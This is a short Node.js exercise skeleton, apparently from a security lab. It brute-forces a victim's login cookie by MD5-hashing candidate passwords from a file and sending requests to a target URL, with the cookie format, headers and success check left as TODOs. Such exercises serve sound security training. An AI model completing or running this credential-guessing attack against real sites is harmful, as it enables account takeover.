const fs = require("fs");
const crypto = require("crypto");

// TODO1:
// Set the missing configuration
const targetUrl = "";
const victimUsername = "";
const inputFilePath = "";

const candidates = fs.readFileSync(inputFilePath, "utf-8").split("\n");

async function bruteForce() {
  for (const password of candidates) {
    const md5Hash = crypto
      .createHash("md5")
      .update(password.trim())
      .digest("hex");

    // TODO 2: construct the cookie value correctly
    const cookiee = null;

    const response = await fetch(targetUrl, {
      method: "GET",
      headers: {
        // TODO 3: send the cookie correctly
      },
    });

    const text = await response.text();

    // TODO 4: detect success and print the result

    console.log("Attempt:", password);
  }
}

bruteForce();
